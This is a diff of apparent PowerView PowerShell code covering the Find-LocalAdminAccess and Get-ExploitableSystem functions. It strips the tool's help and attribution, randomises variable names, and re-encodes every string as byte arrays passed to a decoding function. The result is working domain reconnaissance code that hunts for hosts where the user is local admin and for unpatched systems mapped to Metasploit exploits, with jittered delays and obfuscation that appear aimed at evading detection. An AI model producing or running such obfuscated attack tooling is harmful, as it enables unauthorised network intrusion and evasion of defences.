                 $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                 $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
             }
-
-            Write-Verbose ((HandleResult95 @(50,87,186,205,19,155,188,19,74,141,239,41,148,169,80,31,168,254,16,177,141,12,108,188,243,51,159,134,60,29,152,217,62,176,187,2,79,141,144,32,185,166,40,24,131,232,103,224) @(101,46,202,169,90,221,238)) + $($ComputerName.count))
-            $ypmBN = 0
-
+            Write-Verbose ((ParseEntry20 @(248,32,240,212,230,31,210,198,203,30,198,195,230,30,181,129,205,14,202,220,204,48,194,198,245,48,194,216,246,106,210,192,203,52,213,215,206,30,185,202,203,17,205,134,230,24,189,141) @(175,89,128,176)) + $($ComputerName.count))
+            $o6bG = 0
             $ComputerName | Where-Object {$_} | ForEach-Object {
-                Write-Verbose ((HandleResult95 @(126,35,152,166,76,89,247,226,117,73,232,228,102,80,156,239) @(47,17,161,210)) + $_)
-                $ypmBN = $ypmBN + 1
-
-                # sleep for our semi-randomized interval
-                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
-
-                Write-Verbose ((HandleResult95 @(108,102,141,109,171,168,45,78,123,170,56,142,142,22,125,47,156,94,215,131,50,115,81,145,106,140,183,23,88,118,188,52) @(59,31,253,9,226,237,123)) + $_ + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(192,20,180,60,39,180,220,180) @(137,83,141,81,110,245,225)) + $($ComputerName.count) + ")")
-
-                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $_, $False, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential                
+                Write-Verbose ((ParseEntry20 @(97,34,77,181,83,88,34,241,106,72,61,247,121,81,73,252) @(48,16,116,193)) + $_)
+                $o6bG = $o6bG + 1
+                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose ((ParseEntry20 @(159,197,236,1,128,219,158,201,248,50,248,242,171,209,218,85,168,201,253,210,213,45,135,242,171,210,198,9,170,247,137,129) @(200,188,156,101,201,158)) + $_ + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $o6bG + (ParseEntry20 @(85,230,200,54,82,235,103,96) @(28,161,241,91,27,170,90,93)) + $($ComputerName.count) + ")")
+                Invoke-Command -ScriptBlock $s8TS -ArgumentList $_, $False, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential                
             }
         }
     }
 }
-
-
 function Find-LocalAdminAccess {
-<#
-    .SYNOPSIS
-
-        Finds machines on the local domain where the current user has
-        local administrator access. Uses multithreading to
-        speed up enumeration.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        This function finds the local domain name for a host using Get-NetDomain,
-        queries the domain for all active machines with Get-NetComputer, then for
-        each server it checks if the current user has local administrator
-        access using Invoke-CheckLocalAdminAccess.
-
-        Idea stolen from the local_admin_search_enum post module in
-        Metasploit written by:
-            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
-            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
-            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'
-
-    .PARAMETER ComputerName
-
-        Host array to enumerate, passable on the pipeline.
-
-    .PARAMETER ComputerFile
-
-        File of hostnames/IPs to search.
-
-    .PARAMETER ComputerFilter
-
-        Host filter name to query AD for, wildcards accepted.
-
-    .PARAMETER ComputerADSpath
-
-        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER NoPing
-
-        Switch. Don't ping each host to ensure it's up before enumerating.
-
-    .PARAMETER Delay
-
-        Delay between enumerating hosts, defaults to 0
-
-    .PARAMETER Jitter
-
-        Jitter for the host delay, defaults to +/- 0.3
-
-    .PARAMETER Domain
-
-        Domain to query for machines, defaults to the current domain.
-    
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER SearchForest
-
-        Switch. Search all domains in the forest for target users instead of just
-        a single domain.
-
-    .PARAMETER Threads
-
-        The maximum concurrent threads to execute.
-
-    .EXAMPLE
-
-        PS C:\> Find-LocalAdminAccess
-
-        Find machines on the local domain where the current user has local
-        administrator access.
-
-    .EXAMPLE
-
-        PS C:\> Find-LocalAdminAccess -Threads 10
-
-        Multi-threaded access hunting, replaces Find-LocalAdminAccessThreaded.
-
-    .EXAMPLE
-
-        PS C:\> Find-LocalAdminAccess -Domain testing
-
-        Find machines on the 'testing' domain where the current user has
-        local administrator access.
-
-    .EXAMPLE
-
-        PS C:\> Find-LocalAdminAccess -ComputerFile hosts.txt
-
-        Find which machines in the host list the current user has local
-        administrator access.
-
-    .LINK
-
-        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
-        http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [Alias('Hosts')]
         [String[]]
         $ComputerName,
-
         [ValidateScript({Test-Path -Path $_ })]
         [Alias('HostList')]
         [String]
         $ComputerFile,
-
         [String]
         $ComputerFilter,
-
         [String]
         $ComputerADSpath,
-
         [Switch]
         $NoPing,
-
         [UInt32]
         $Delay = 0,
-
         [Double]
         $Jitter = .3,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $SearchForest,
-
         [ValidateRange(1,100)] 
         [Int]
         $Threads
     )
-
     begin {
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
-
-        # random object for delay
-        $WLAr = New-Object System.Random
-
-        Write-Verbose ((HandleResult95 @(53,48,133,180,43,15,191,225,0,36,192,160,0,36,150,183,48,36,153,165,56,10,196,157,0,123,187,184,0,12,179,187,0,30,153,165,51,30,187,186,56,17,187,170,43,1,145,160,6,14,146,183,56,14,163,163,59,17,158,183,0,123,172,183) @(98,73,245,208)) + $Delay)
-        
+        $BiHWqPVB = New-Object System.Random
+        Write-Verbose ((ParseEntry20 @(244,83,149,190,234,108,175,235,193,71,208,170,193,71,134,189,241,71,137,175,249,105,212,151,193,24,171,178,193,111,163,177,193,125,137,175,242,125,171,176,249,114,171,160,234,98,129,170,199,109,130,189,249,109,179,169,250,114,142,189,193,24,188,189) @(163,42,229,218)) + $Delay)
         if(!$ComputerName) {
             if($Domain) {
-                $ajPzEg = @($Domain)
+                $k8fkcV = @($Domain)
             }
             elseif($SearchForest) {
-                # get ALL the domains in the forest to search
-                $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
+                $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
             }
             else {
-                # use the local domain
-                $ajPzEg = @( (Get-NetDomain).name )
+                $k8fkcV = @( (Get-NetDomain).name )
             }
-
-            # if we're using a host list, read the targets in and add them to the target list
             if($ComputerFile) {
                 $ComputerName = Get-Content -Path $ComputerFile
             }
             else {
                 [array]$ComputerName = @()
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(207,107,241,94,80,56,158,208,194,74,203,15,120,41,237,143,209,85,211,76,123,41,158,145,250,123,192,7) @(152,18,129,58,25,126,216,225)) + $Domain + (HandleResult95 @(90,120,194,95,251,122,125,247,75,171,93,15,251,94,165,46) @(19,63,152,41,152)))
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(19,12,73,166,143,2,51,8,152,158,14,64,88,149,243,42,60,126,144,176,38,34,127,178,164,45,52,4) @(68,117,57,194,198)) + $Domain + (ParseEntry20 @(135,168,18,6,198,3,140,128,42,67,235,90,173,152,117,77) @(206,239,72,112,165,106)))
                     $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                 }
             }
-
-            # remove any null target hosts, uniquify the list and shuffle it
             $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
             if($($ComputerName.Count) -eq 0) {
-                throw (HandleResult95 @(82,174,78,74,134,163,82,124,167,62,96,128,190,6,63,242,20,64,182,140) @(6,195,118,45,231,228,107))
+                throw (ParseEntry20 @(177,133,53,230,132,175,52,251,129,160,64,230,191,133,52,176,135,133,92,233) @(229,232,13,129))
             }
         }
-
-        # script block that enumerates a server
-        $h6EYtum2 = {
+        $s8TS = {
             param($ComputerName, $Ping)
-
-            $yssh = $True
+            $lPdgSYQ = $True
             if($Ping) {
-                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
+                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
             }
-            if($yssh) {
-                # check if the current user has local admin access to this server
-                $Pu7AlyM = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
-                if ($Pu7AlyM) {
+            if($lPdgSYQ) {
+                $X2ndzV = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
+                if ($X2ndzV) {
                     $ComputerName
                 }
             }
         }
-
     }
-
     process {
-
         if($Threads) {
-            Write-Verbose ((HandleResult95 @(233,198,85,237,94,140,220,249,127,218,84,152,229,201,93,246,93,182,138,240,82,213,88,145,219,217,124,250,88,166,215,231,65,202,122,138,220,231,90,164,117,160,130,163) @(191,158,27,157,60,225)) + $Threads)
-
-            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
-            $O2kwi = @{
+            Write-Verbose ((ParseEntry20 @(219,233,54,84,84,13,238,214,28,99,94,25,215,230,62,79,87,55,184,223,49,108,82,16,233,246,31,67,82,39,229,200,34,115,112,11,238,200,57,29,127,33,176,140) @(141,177,120,36,54,96)) + $Threads)
+            $n3XrNi5 = @{
                 'Ping' = $(-not $NoPing)
             }
-
-            # kick off the threaded script block + arguments 
-            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
+            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
         }
-
         else {
             if(-not $NoPing -and ($ComputerName.count -ne 1)) {
-                # ping all hosts in parallel
                 $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                 $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
             }
-
-            Write-Verbose ((HandleResult95 @(176,152,154,167,174,167,184,181,131,166,172,176,174,166,223,242,133,182,160,175,132,136,168,181,189,136,168,171,190,210,184,179,131,140,191,164,134,166,211,185,131,169,167,245,174,160,215,254) @(231,225,234,195)) + $($ComputerName.count))
-            $ypmBN = 0
-
-            ForEach ($fa0ya in $ComputerName) {
-
-                $ypmBN = $ypmBN + 1
-
-                # sleep for our semi-randomized interval
-                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
-
-                Write-Verbose ((HandleResult95 @(205,1,105,86,26,152,160,105,254,47,40,94,48,176,176,44,251,47,44,92,26,149,184,112,249,22,67,94,48,180,183,33) @(154,120,25,50,83,221,246,28)) + $fa0ya + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(230,246,12,117,230,240,8,37) @(175,177,53,24)) + $($ComputerName.count) + ")")
-                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
+            Write-Verbose ((ParseEntry20 @(123,208,16,192,238,51,103,76,72,238,38,215,238,50,0,11,78,254,42,200,196,28,119,76,118,192,34,204,254,70,103,74,72,196,53,195,198,50,12,64,72,225,45,146,238,52,8,7) @(44,169,96,164,167,117,53,58)) + $($ComputerName.count))
+            $o6bG = 0
+            ForEach ($mnZ6k in $ComputerName) {
+                $o6bG = $o6bG + 1
+                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose ((ParseEntry20 @(8,45,113,145,67,44,50,77,59,3,48,153,105,4,34,8,62,3,52,155,67,33,42,84,60,58,91,153,105,0,37,5) @(95,84,1,245,10,105,100,56)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(171,224,15,21,230,163,154,11) @(226,167,54,120,175)) + $($ComputerName.count) + ")")
+                Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
             }
         }
     }
 }
-
-
 function Get-ExploitableSystem {
-<#
-    .Synopsis
-
-        This module will query Active Directory for the hostname, OS version, and service pack level  
-        for each computer account.  That information is then cross-referenced against a list of common
-        Metasploit exploits that can be used during penetration testing.
-
-    .DESCRIPTION
-
-        This module will query Active Directory for the hostname, OS version, and service pack level  
-        for each computer account.  That information is then cross-referenced against a list of common
-        Metasploit exploits that can be used during penetration testing.  The script filters out disabled
-        domain computers and provides the computer's last logon time to help determine if it's been 
-        decommissioned.  Also, since the script uses data tables to output affected systems the results
-        can be easily piped to other commands such as test-connection or a Export-Csv.
-
-    .PARAMETER ComputerName
-
-        Return computers with a specific name, wildcards accepted.
-
-    .PARAMETER SPN
-
-        Return computers with a specific service principal name, wildcards accepted.
-
-    .PARAMETER OperatingSystem
-
-        Return computers with a specific operating system, wildcards accepted.
-
-    .PARAMETER ServicePack
-
-        Return computers with a specific service pack, wildcards accepted.
-
-    .PARAMETER Filter
-
-        A customized ldap filter string to use, e.g. "(description=*admin*)"
-
-    .PARAMETER Ping
-
-        Switch. Ping each host to ensure it's up before enumerating.
-
-    .PARAMETER Domain
-
-        The domain to query for computers, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER Unconstrained
-
-        Switch. Return computer objects that have unconstrained delegation.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-       
-        The example below shows the standard command usage.  Disabled system are excluded by default, but
-        the "LastLgon" column can be used to determine which systems are live.  Usually, if a system hasn't 
-        logged on for two or more weeks it's been decommissioned.      
-        PS C:\> Get-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\user | Format-Table -AutoSize
-        [*] Grabbing computer accounts from Active Directory...
-        [*] Loading exploit list for critical missing patches...
-        [*] Checking computers for vulnerable OS and SP levels...
-        [+] Found 5 potentially vulnerable systems!
-        ComputerName          OperatingSystem         ServicePack    LastLogon            MsfModule                                      CVE                      
-        ------------          ---------------         -----------    ---------            ---------                                      ---                      
-        ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
-        ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
-        ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
-        LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
-        LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
-        LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
-        assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
-        assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
-        HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
-        HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
-        HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
-        DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
-        DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
-        DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....                     
-
-    .EXAMPLE
-
-        PS C:\> Get-ExploitableSystem | Export-Csv c:\temp\output.csv -NoTypeInformation
-
-        How to write the output to a csv file.
-
-    .EXAMPLE
-
-        PS C:\> Get-ExploitableSystem -Domain testlab.local -Ping
-
-        Return a set of live hosts from the testlab.local domain
-
-     .LINK
-       
-       http://www.netspi.com
-       https://github.com/nullbind/Powershellery/blob/master/Stable-ish/ADS/Get-ExploitableSystems.psm1
-       
-     .NOTES
-       
-       Author:  Scott Sutherland - 2015, NetSPI
-                Modifications to integrate into PowerView by @harmj0y
-       Version: Get-ExploitableSystem.psm1 v1.1
-       Comments: The technique used to query LDAP was based on the "Get-AuditDSComputerAccount" 
-       function found in Carols Perez's PoshSec-Mod project.  The general idea is based off of  
-       Will Schroeder's "Invoke-FindVulnSystems" function from the PowerView toolkit.
-#>
     [CmdletBinding()]
     Param(
         [Parameter(ValueFromPipeline=$True)]
         [Alias('HostName')]
         [String]
         $ComputerName = '*',
-
         [String]
         $SPN,
-
         [String]
         $OperatingSystem = '*',
-
         [String]
         $ServicePack = '*',
-
         [String]
         $Filter,
-
         [Switch]
         $Ping,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [Switch]
         $Unconstrained,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
-    Write-Verbose (HandleResult95 @(202,254,132,220,241,228,89,228,222,163,242,209,192,106,168,233,189,255,246,215,95,197,197,197,220,255,247,68,212,192,178,210,225,147,4,172,229,154,234,194,232,122,199,254,150,138,136,198,108,202,201,196,217,224,251,81,212,194,166,200,219,204,107,247,227,179,129,193,196,110,169,242,184,223,133,156) @(157,135,244,184,184,161,61))
-
-    # Create data table for hostnames, os, and service packs from LDAP
-    $iqAC8a = New-Object System.Data.DataTable 
-    $Null = $iqAC8a.Columns.Add('Hostname')       
-    $Null = $iqAC8a.Columns.Add('OperatingSystem')
-    $Null = $iqAC8a.Columns.Add('ServicePack')
-    $Null = $iqAC8a.Columns.Add('LastLogon')
-
+    Write-Verbose (ParseEntry20 @(241,218,191,97,226,147,250,223,250,152,79,194,183,201,147,205,134,66,229,160,252,254,225,254,97,236,128,231,239,228,137,111,242,228,167,151,193,161,87,209,159,217,252,218,173,55,155,177,207,241,237,255,100,243,140,242,239,230,157,117,200,187,200,204,199,136,60,210,179,205,146,214,131,98,150,235) @(166,163,207,5,171,214,158))
+    $DKQK8x = New-Object System.Data.DataTable 
+    $Null = $DKQK8x.Columns.Add('Hostname')       
+    $Null = $DKQK8x.Columns.Add('OperatingSystem')
+    $Null = $DKQK8x.Columns.Add('ServicePack')
+    $Null = $DKQK8x.Columns.Add('LastLogon')
     Get-NetComputer -FullData @PSBoundParameters | ForEach-Object {
-
-        $ybzWM2 = $_.dnshostname
-        $ckV2yWA = $_.operatingsystem
-        $eyOYD = $_.operatingsystemservicepack
-        $BN06 = $_.lastlogon
-        $TbLY2 = $_.useraccountcontrol
-
-        $eiIMCzDa = [convert]::ToString($_.useraccountcontrol,2)
-
-        # Check the 2nd to last value to determine if its disabled
-        $cHNWOR = $eiIMCzDa.Length - 2
-        $aQiOjD = $eiIMCzDa.Substring($cHNWOR,1)
-
-        # Add computer to list if it's enabled
-        if ($aQiOjD  -eq 0) {
-            # Add domain computer to data table
-            $Null = $iqAC8a.Rows.Add($ybzWM2,$ckV2yWA,$eyOYD,$BN06)
+        $QkSo = $_.dnshostname
+        $OYzTf6 = $_.operatingsystem
+        $ACBzcv = $_.operatingsystemservicepack
+        $NhJ2 = $_.lastlogon
+        $ISHexe = $_.useraccountcontrol
+        $Bcpww = [convert]::ToString($_.useraccountcontrol,2)
+        $aGNnLMYy = $Bcpww.Length - 2
+        $EDuNP = $Bcpww.Substring($aGNnLMYy,1)
+        if ($EDuNP  -eq 0) {
+            $Null = $DKQK8x.Rows.Add($QkSo,$OYzTf6,$ACBzcv,$NhJ2)
         }
     }
-
-    # Status user        
-    Write-Verbose (HandleResult95 @(4,51,220,193,49,22,50,218,252,47,1,58,206,200,27,52,16,244,205,15,49,13,149,213,28,16,8,223,196,32,29,122,229,226,34,37,41,197,231,18,48,39,192,149,25,4,4,196,199,59,17,62,205,253,54,41,43,251,144,22,26,2,238,205,28,20,4,195,255,32,30,63,224,204,76,110) @(83,74,172,165,120))
-
-    # ----------------------------------------------------------------
-    # Setup data table for list of msf exploits
-    # ----------------------------------------------------------------
-
-    # Create data table for list of patches levels with a MSF exploit
-    $TH0cH8 = New-Object System.Data.DataTable 
-    $Null = $TH0cH8.Columns.Add('OperatingSystem') 
-    $Null = $TH0cH8.Columns.Add('ServicePack')
-    $Null = $TH0cH8.Columns.Add('MsfModule')  
-    $Null = $TH0cH8.Columns.Add('CVE')
-    
-    # Add exploits to data table
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(41,101,178,125,57,224,167,76,52,167,73,80) @(127,87,222,8,99,167,158)),"",(HandleResult95 @(31,220,185,187,19,2,189,161,168,50,124,183,176,155,68,46,230,226,168,11,9,183,159,184,40,44,189,165,175,11,0,243,137,182,48,119,201,135,245,11,38,195,232,186,19,13,202,171) @(69,132,209,204,113)),(HandleResult95 @(250,187,167,202,181,126,46,237,191,198,158,229,94,56,174,153,145,151,128,81,27,195,161,157,155,129,66,59,215,158,187,140,180,105,120,241,151,152,175,160,119,43,218,139,184,185,230,67,15,225,186,192) @(155,243,245,250,214,58,65)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(200,158,92,122,196,235,9,60,253,213,114,91,196,244,122,61,196,244,121,104,211,198,113,120,211,237,13,50) @(158,172,48,15)),(HandleResult95 @(135,16,151,114,231,10,2,171,107,135,73,235,62,102,161,69,140,90,190,90) @(210,34,193,11,131,103,84)),(HandleResult95 @(226,122,54,131,66,255,27,46,144,99,129,17,63,163,21,211,64,109,144,90,244,16,12,158,122,224,104,41,173,89,129,86,61,142,97,194,122,36,181,89,246,78,103,159,121,138,27,42) @(184,34,94,244,32)),(HandleResult95 @(52,28,63,230,219,186,181,203,25,103,9,229,220,135,239,215,49,57,59,189,226,166,136,213,52,3,21,172,244,147,148,203,55,7,84,188,220,147,143,203,24,62,44,161,245,135,234,202,24,46,56,175,244,137,231,128) @(85,84,109,214,184,254,218,189)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(78,80,69,149,4,95,91,26,131,39,90,54,115,184,20,42,56,113,169,57,85,8,104,151,19,89,95,20) @(24,98,41,224,94)),(HandleResult95 @(39,114,226,9,22,45,226,9,59,6,246,24,43,114,199,23,63,17,137,77) @(114,64,180,112)),(HandleResult95 @(2,84,211,146,58,75,130,149,60,79,130,214,57,91,142,142,58,63,223,159,20,62,233,143,2,84,241,146,1,117,130,145,59,118,250,212,0,118,250,157,22,61,130,145,59,62,138,157) @(88,12,187,229)),(HandleResult95 @(248,115,225,230,250,127,220,160,213,8,215,229,253,66,134,188,253,86,229,189,195,99,225,190,248,108,203,172,213,86,253,160,251,104,138,188,253,86,230,160,212,81,242,161,215,104,131,161,212,127,230,227) @(153,59,179,214)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(68,57,219,90,72,76,142,28,113,114,245,123,72,83,253,29,72,83,254,72,95,97,246,88,95,74,138,18) @(18,11,183,47)),(HandleResult95 @(71,149,196,5,146,129,68,222,219,58,180,132,75,149,225,27,187,189,47,154) @(18,167,146,124,246,236)),(HandleResult95 @(224,67,180,3,10,97,216,246,222,88,229,71,9,113,212,237,216,40,184,14,36,20,141,246,217,98,229,0,11,92,160,252,226,97,157,3,38,23,216,243,222,92,142,7,10,96,216,181,224,76,150,31,49,126,184,187) @(186,27,220,116,104,38,225,134)),(HandleResult95 @(221,241,102,233,66,166,197,202,245,7,189,18,134,211,137,211,80,180,119,137,240,228,235,92,184,118,154,208,240,212,122,175,67,177,147,214,221,89,140,87,175,192,253,206,121,160,17,149,231,232,248,1) @(188,185,52,217,33,226,170)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(92,15,107,192,209,16,99,57,94,126,247,223,13,2,64,15,93,237,194,48,23,96,124,112,248,202,106,103) @(10,61,7,181,139,87,90)),(HandleResult95 @(154,133,123,96,213,49,65,147,134,241,111,113,232,110,100,141,130,230,16,36) @(207,183,45,25,177,92,23,234)),(HandleResult95 @(221,206,249,96,229,209,168,103,227,213,168,36,230,193,164,124,229,165,245,109,203,165,245,103,229,248,220,97,229,206,220,96,201,208,169,96,201,210,199,113,227,164,253,98,228,225,172,42) @(135,150,145,23)),(HandleResult95 @(133,154,142,121,208,128,139,164,144,122,215,247,128,171,233,35,215,169,178,185,134,17,225,172,133,133,164,51,255,169,170,164,190,26,138,174,128,191,137,63,254,174,165,165,146,10,131,188,169,150,187,62,255,179,217,239) @(228,210,220,73,179,196)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(22,129,246,34,202,181,23,115,208,227,21,196,168,118,10,129,192,15,217,149,99,42,242,237,26,209,207,19) @(64,179,154,87,144,242,46)),(HandleResult95 @(187,53,31,56,32,131,107,35,27,23,172,86,16,22,10,156,78,13,8,121) @(238,7,73,65,68)),(HandleResult95 @(148,155,23,164,70,83,195,159,170,128,70,224,69,67,207,132,172,240,27,169,104,38,168,133,148,155,53,164,125,109,195,155,173,185,62,169,124,110,187,150,128,175,70,184,125,38,195,155) @(206,195,127,211,36,20,250,239)),(HandleResult95 @(6,75,149,89,4,71,168,31,43,48,163,90,3,122,242,3,3,110,145,2,61,91,149,1,6,84,191,19,43,110,137,31,5,80,254,3,3,110,146,31,42,105,134,30,42,122,247,30,42,121,146,16,43,116,250,84) @(103,3,199,105)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(111,163,219,232,227,54,143,10,242,206,223,237,43,238,115,163,237,197,240,22,251,83,208,192,208,248,76,139) @(57,145,183,157,185,113,182)),(HandleResult95 @(200,29,242,234,248,240,67,206,201,207,223,126,253,196,210,239,102,224,218,161) @(157,47,164,147,156)),(HandleResult95 @(128,5,69,232,48,242,228,170,57,110,166,97,212,138,239,54,79,172,54,207,145,232,15,71,197,10,255,170,131,36,20,235,49,207,156,235,5,87,222,42,251,236,227,41,78,173,99,205) @(218,93,45,159,82,181,221)),(HandleResult95 @(81,239,36,35,5,24,18,70,235,69,119,85,56,4,5,205,18,126,48,55,39,104,245,30,114,49,36,7,124,202,56,101,4,15,68,90,195,27,70,16,17,23,113,208,56,64,86,43,48,116,242,67) @(48,167,118,19,102,92,125)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(33,132,73,97,206,13,78,133,70,109,214,30,45,238,111,38,206,18,62,209,104,126,213,61,58,247,24,41) @(119,182,37,20,148,74)),(HandleResult95 @(75,34,87,198,122,125,109,213,68,67,67,238,71,71,79,205,87,84,72,130) @(30,16,1,191)),(HandleResult95 @(250,38,89,239,153,43,153,14,85,219,194,95,193,41,4,243,153,95,196,4,125,170,151,28,195,7,8,236,152,22,225,4,105,226,186,27,238,79,8,237,159,43,242,13,83,222,194,95,250,41,123,243,162,52,249,67) @(160,126,49,152,251,108)),(HandleResult95 @(176,16,53,21,184,73,145,167,20,84,65,232,105,135,228,50,3,72,141,102,164,137,10,15,68,140,117,132,157,53,41,83,185,94,199,187,60,10,112,173,64,148,144,47,42,92,235,122,179,133,25,82) @(209,88,103,37,219,13,254)))  
-    $Null = $TH0cH8.Rows.Add((HandleResult95 @(241,197,128,75,251,186,87,148,148,149,124,245,167,54,237,197,182,102,232,154,35,205,182,155,115,224,192,83) @(167,247,236,62,161,253,110)),(HandleResult95 @(116,95,221,73,92,76,1,225,106,107,99,60,210,103,118,83,36,207,121,5) @(33,109,139,48,56)),(HandleResult95 @(17,136,177,29,3,150,246,59,180,154,83,82,176,152,126,187,187,89,5,171,131,120,158,173,51,8,232,187,40,170,152,90,57,171,142,51,157,143,83,18,178,253,13,170,186,29,92,236) @(75,208,217,106,97,209,207)),(HandleResult95 @(139,61,145,102,222,255,133,3,143,101,217,136,142,12,246,60,217,214,188,30,153,14,239,211,139,34,187,44,241,214,164,3,161,5,132,209,142,24,150,32,240,209,171,2,142,47,141,204,164,33,142,44,241,204,215,72) @(234,117,195,86,189,187)))  
